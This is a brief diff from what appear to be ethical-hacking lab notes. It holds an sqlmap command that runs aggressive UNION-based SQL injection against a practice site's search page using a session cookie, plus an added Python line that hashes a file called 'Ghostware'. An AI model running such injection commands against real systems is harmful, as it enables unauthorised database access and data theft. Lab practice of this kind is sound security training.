@@ -34,4 +34,4 @@ sqlmap -u "http://cinema.cehorg.com/search.aspx" \
 --cookie="mscope=KAp/1eKUZTg=" \
 --level=5 --risk=3 --technique=U --batch
 
-
+python -c "import hashlib; print(hashlib.sha224(open('C:\\Users\\Administrator\\Documents\\Ghostware','rb').read()).hexdigest())"
